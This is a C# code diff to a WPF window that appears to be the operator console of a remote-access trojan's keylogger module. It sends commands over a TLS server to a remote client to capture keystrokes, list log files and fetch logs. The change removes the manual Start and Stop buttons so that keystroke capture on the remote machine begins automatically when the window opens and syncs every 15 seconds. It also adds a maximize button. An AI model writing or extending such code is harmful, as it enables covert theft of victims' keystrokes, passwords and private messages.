@@ -13,6 +13,7 @@ public partial class KeyloggerWindow : Window
     private readonly TlsServer _server;
     private readonly string    _clientId;
     private bool               _capturing;
+    private bool               _maximized;
     private string             _currentFilename = "";
     private readonly DispatcherTimer _autoRefresh = new() { Interval = TimeSpan.FromSeconds(15) };
 
@@ -37,9 +38,13 @@ public partial class KeyloggerWindow : Window
             _autoRefresh.Stop();
         };
 
-        // Load file list on open
+        // Auto-start capturing on open + load file list
         Loaded += async (_, _) =>
+        {
+            await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStart });
+            _capturing = true; UpdateBadge(); _autoRefresh.Start();
             await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
+        };
     }
 
     // ── Outgoing ────────────────────────────────────────────────────────────
@@ -107,27 +112,6 @@ public partial class KeyloggerWindow : Window
 
     // ── Button handlers ──────────────────────────────────────────────────────
 
-    private async void BtnStart_Click(object s, RoutedEventArgs e)
-    {
-        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStart });
-        _capturing = true; UpdateBadge();
-        BtnStart.IsEnabled = false; BtnStop.IsEnabled = true;
-        _autoRefresh.Start();
-        TxtStatus.Text = "Capturing — auto-sync every 15 s";
-    }
-
-    private async void BtnStop_Click(object s, RoutedEventArgs e)
-    {
-        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStop });
-        _capturing = false; UpdateBadge();
-        BtnStart.IsEnabled = true; BtnStop.IsEnabled = false;
-        _autoRefresh.Stop();
-        RequestLogs();
-        // Refresh file list after stop so new file appears
-        await Task.Delay(600);
-        RequestFileList();
-    }
-
     private void BtnRefresh_Click(object s, RoutedEventArgs e) => RequestFileList();
 
     private async void ListFiles_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
@@ -177,15 +161,20 @@ public partial class KeyloggerWindow : Window
     private void BtnSave_Click(object s, RoutedEventArgs e) => BtnDownload_Click(s, e);
 
     private void UpdateBadge()
+        => BadgeRunning.Visibility = _capturing ? Visibility.Visible : Visibility.Collapsed;
+
+    private void BtnMax_Click(object s, RoutedEventArgs e)
     {
-        BadgeRunning.Visibility = _capturing ? Visibility.Visible : Visibility.Collapsed;
-        if (_capturing) { BtnStart.IsEnabled = false; BtnStop.IsEnabled = true; }
-        else            { BtnStart.IsEnabled = true;  BtnStop.IsEnabled = false; }
+        _maximized = !_maximized;
+        WindowState = _maximized ? WindowState.Maximized : WindowState.Normal;
+        RootBorder.CornerRadius = _maximized ? new CornerRadius(0) : new CornerRadius(8);
+        BtnMax.Content = _maximized ? "❐" : "☐";
     }
 
     private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
     {
-        if (e.LeftButton == MouseButtonState.Pressed) DragMove();
+        if (e.LeftButton == MouseButtonState.Pressed && WindowState != WindowState.Maximized)
+            DragMove();
     }
     private void Close_Click(object s, RoutedEventArgs e) => Close();
 }
